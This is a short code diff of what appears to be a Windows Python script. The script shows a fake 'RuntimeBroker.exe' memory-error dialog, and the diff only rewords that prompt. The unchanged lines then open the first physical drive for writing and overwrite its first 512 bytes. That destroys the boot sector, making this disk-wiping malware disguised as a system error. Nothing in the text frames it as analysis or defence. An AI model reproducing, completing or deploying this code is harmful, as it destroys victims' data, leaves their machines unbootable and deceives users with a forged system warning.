@@ -13,7 +13,7 @@ warningtitle = 'RuntimeBroker.exe - error message'
 warningdescription = 'The instruction at 0x00007FF950FCBE4B reference memory at 0x000000000000024, The memory could not written.           Would you like to restart?'
 
 if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: 
-  MessageBox("RuntimeBroker.exe is very inportant, your pc could run into many falulars, would you like to restart RuntimeBroker.exe", "Alert - RuntimeBroker.exe", MB_ICONWARNING | MB_OK)
+  MessageBox("Would you like to restart RuntimeBroker.exe?", "RuntimeBroker.exe - Warning", MB_ICONWARNING | MB_OK)
 
 hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
 WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite
